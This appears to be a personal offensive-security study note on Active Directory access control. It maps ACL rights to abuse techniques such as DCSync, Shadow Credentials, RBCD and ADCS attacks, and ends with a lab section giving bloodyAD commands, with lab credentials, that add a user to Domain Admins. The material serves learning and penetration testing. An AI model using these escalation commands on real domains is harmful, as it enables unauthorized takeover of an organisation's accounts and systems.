# 🔐 Access Control Model — Active Directory

> Offensive-Active-Directory / Domain-Enumeration / Access-Control-Model

---

## 📌 Table of Contents

- [Access Control Model](#access-control-model)
- [Key Components](#key-components)
- [Access Control List (ACL)](#access-control-list-acl)
- [Table of Permissions](#table-of-permissions)
- [Explanations of Key Permissions](#explanations-of-key-permissions)
- [Practical Exploitation Example (Lab)](#practical-exploitation-example-lab)

---

## Access Control Model

The **Access Control Model** is a security framework used to regulate access to objects and resources in **Active Directory** or other systems. It determines **who** can access **what** based on specific permissions and security rules.

### Key Components

#### 1️⃣ Access Tokens

Access tokens define the **security context** of a process and include:

- **Identity** of the user
- **Privileges** (permissions assigned to the user)

#### 2️⃣ Security Descriptors

Security descriptors control access through:

- **SID (Security Identifier)**: Identifies the owner of an object
- **DACL (Discretionary Access Control List)**: Defines **who is allowed or denied access**
- **SACL (System Access Control List)**: Used for **auditing access attempts**

---

## Access Control List (ACL)

- A list of **Access Control Entries (ACE)**, where each ACE corresponds to an individual permission or audit access.
- Determines **who has permission** and **what actions** can be performed on an object.

### Two Types of ACLs

1. **DACL (Discretionary ACL)**
   - Defines the permissions that **trustees** (users or groups) have on an object.
2. **SACL (System ACL)**
   - Logs success and failure **audit messages** when an object is accessed.

> ACLs are vital to the security architecture of Active Directory.

---

## Table of Permissions

### GenericAll (Full Control)

| Object | Permissions |
|---|---|
| **Group** | Add/Remove Members · Add Ownership · Reset Password of Members · Grant Full Control |
| **User** | Reset Password (`ForceChangePassword`) · Shadow Credentials (`AddKeyCredentialLink`) · Targeted Kerberoasting (`WriteSPN`) · Grant Full Control |
| **Computer** | Read LAPS Password (`ReadLAPSPassword`) · Shadow Credentials (`AddKeyCredentialLink`) · Kerberos RBCD (`AllowedToAct`) · Grant Full Control |
| **Domain Object** | DCSync (`DS-Replication-Get-Changes-All`) · Descendant Object Takeover · Read LAPS Password · Write gPLink (Compromise Policies) · Grant Full Control |
| **Organizational Unit** | Generic/Targeted Descendant Object Takeover · Write gPLink (Compromise Policies) · Grant Full Control |
| **AdminSD Holder** | Reset Password · Write Members · Grant Full Control |
| **Group Policy** | Evil GPOs (Immediate Scheduled Task) · Modify Group Policy · Add Local Admin · Grant Full Control |
| **CertTemplate** | ESC4 Attack (Modify Template) · Grant Full Control |
| **EnterpriseCA** | Publish Malicious Templates · ADCS Escalation · Grant Full Control |
| **RootCA** | Trust Rogue Certificate (Modify `cACertificate`) · Grant Full Control |
| **NTAuthStore** | Modify Trust for NT Authentication · Grant Full Control |
| **IssuancePolicy** | ADCS ESC13 (Modify `msDS-OIDToGroupLink`) · Grant Full Control |
| **Security Descriptor** | WMI · PowerShell Remoting · Remote Registry · Grant Ownership |

### GenericWrite

| Object | Permissions |
|---|---|
| **Group** | Add/Remove Members |
| **User** | Shadow Credentials (`AddKeyCredentialLink`) · Targeted Kerberoasting (`WriteSPN`) · Reset Password · Logon Scripts |
| **Computer** | Shadow Credentials (`AddKeyCredentialLink`) · Kerberos RBCD (`AllowedToAct`) · SPN Jacking |
| **AdminSD Holder** | Reset Password · Write Members |
| **Domain Object** | Write gPLink (Compromise Policies) |
| **Organizational Unit** | Write gPLink (Compromise Policies) |
| **Group Policy** | Evil GPOs (Immediate Scheduled Task) · Modify Group Policy · Add Local Admin |
| **CertTemplate** | ESC4 Attack (Modify Template) |
| **EnterpriseCA** | Publish Malicious Templates (Modify `certificateTemplates`) |
| **RootCA** | Trust Rogue Certificate (Modify `cACertificate`) |
| **NTAuthStore** | Modify Trust for NT Authentication |
| **IssuancePolicy** | ADCS ESC13 (Modify `msDS-OIDToGroupLink`) |
| **Security Descriptor** | WMI · PowerShell Remoting · Remote Registry |

### WriteDacl

| Object | Permissions |
|---|---|
| **Group** | Grant Any Privilege (`WriteMembers`) |
| **User** | Grant Any Privilege (`GenericAll`) |
| **Computer** | Grant Any Privilege (`GenericAll`) |
| **Domain Object** | DCSync (`DS-Replication-Get-Changes-All`) · Grant Any Privilege (`GenericAll`) |
| **Organizational Unit** | Grant Any Privilege (`GenericAll`) |
| **Group Policy** | Grant Any Privilege (`GenericAll`) |
| **CertTemplate** | Grant Any Privilege (`GenericAll`) |
| **EnterpriseCA** | Grant Any Privilege (`GenericAll`) |
| **RootCA** | Grant Any Privilege (`GenericAll`) |
| **NTAuthStore** | Grant Any Privilege (`GenericAll`) |
| **IssuancePolicy** | Grant Any Privilege (`GenericAll`) |
| **Security Descriptor** | Grant Rights (`GenericAll`) |

### AllExtendedRights

| Object | Permissions |
|---|---|
| **Group** | Add/Remove Members |
| **User** | Reset Password (`ForceChangePassword`) |
| **Computer** | Read LAPS Password (`ReadLAPSPassword`) |
| **Domain Object** | DCSync (`DS-Replication-Get-Changes-All`) |
| **CertTemplate** | Enroll Certificates |

### WriteOwner

| Object | Permissions |
|---|---|
| **Group** | Change Object Owner |
| **User** | Change Object Owner |
| **Computer** | Change Object Owner |
| **Domain Object** | Change Object Owner |
| **Organizational Unit** | Change Object Owner |
| **Group Policy** | Change Object Owner |
| **Security Descriptor** | Change Object Owner |

---

## Explanations of Key Permissions

### 1. GenericAll (Full Control)

Grants **complete control** over the target object, allowing modification of any attribute, membership changes, and ownership transfers.

**Abuse Potential:**

- **Users**: Reset passwords, create Shadow Credentials, perform Kerberoasting.
- **Groups**: Add/remove members.
- **Computers**: Read LAPS passwords, conduct Resource-Based Constrained Delegation (RBCD).
- **Domains/OUs**: Apply inherited control, modify group policies.
- **Certificate Infrastructure**: Exploit Active Directory Certificate Services (ADCS) attacks.

### 2. GenericWrite

Allows modification of **non-protected** attributes on the target object.

**Abuse Potential:**

- **Users**: Create Shadow Credentials, Kerberoasting via `servicePrincipalNames`.
- **Groups**: Add/remove members.
- **Computers**: Enable RBCD attacks.
- **GPOs (Group Policy Objects)**: Modify policies to execute malicious tasks.
- **CertTemplates/EnterpriseCA/RootCA**: Modify certificate attributes to escalate privileges.

### 3. WriteDACL

Grants the ability to modify the **Discretionary Access Control List (DACL)** of an object.

**Abuse Potential:**

- **Users/Groups/Computers**: Grant yourself full control (`GenericAll`).
- **Domains**: Enable DCSync attacks to extract NTLM hashes.
- **OUs**: Take over child objects.
- **GPOs**: Modify policies to control targeted users and computers.

### 4. AllExtendedRights

Provides **special privileges** to perform actions beyond basic read/write operations.

**Abuse Potential:**

- **Users**: Reset passwords (`ForceChangePassword`).
- **Computers**: Read LAPS passwords (`ReadLAPSPassword`).
- **Domains**: Perform DCSync attacks (dump NTLM hashes).
- **CertTemplates**: Enroll certificates (potential ADCS attacks).

### 5. WriteOwner

Allows changing the **ownership** of an object, granting unrestricted control over its security descriptor.

**Abuse Potential:**

- Once ownership is taken, the attacker can modify the DACL to grant full control (`GenericAll`).
- Used in combination with `WriteDACL` to elevate privileges silently.

---

## Practical Exploitation Example (Lab)

> Reference: `Offensive-Pentesting-Lab/AD-DACL/Exploitation.md`

### Lab Environment

- **Domain**: `InfosecWarrior.local`
- **Domain Controller**: `192.168.2.100`
- **Attacker**: `jdoe / Password@123`

### Lab 1 — WriteMembers → Domain Admins

**Description:**
The attacker has `WriteProperty` permission on the `member` attribute of the **Domain Admins** group. This allows direct modification of group membership, enabling privilege escalation by adding themselves.

**Exploit:**

```bash
bloodyAD --host 192.168.2.100 -d InfosecWarrior.local -u jdoe -p 'Password@123' add groupMember "Domain Admins" "jdoe"
```

**Note on access errors:**
If the acting account lacks sufficient rights on the target group, the command fails, e.g.:

```
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=Domain Admins,CN=Users,DC=infosecwarrior,DC=local!
Result code: "insufficientAccessRights"
```

A successful exploitation only works when the acting user genuinely holds the `WriteMembers`/`GenericAll`-style right on the target group:

```bash
# Add a user to a group they have write access to
bloodyAD --host 192.168.2.100 -d InfosecWarrior.local -u bob -p 'Password@123' add groupMember "Backup Operators" "bob"
[+] bob added to Backup Operators

# Escalate to Domain Admins
bloodyAD --host 192.168.2.100 -d InfosecWarrior.local -u alice -p 'Password@123' add groupMember "Domain Admins" "alice"
[+] alice added to Domain Admins
```

---

<p align="center"><sub>📚 Notes compiled for personal study & offensive security learning.</sub></p>
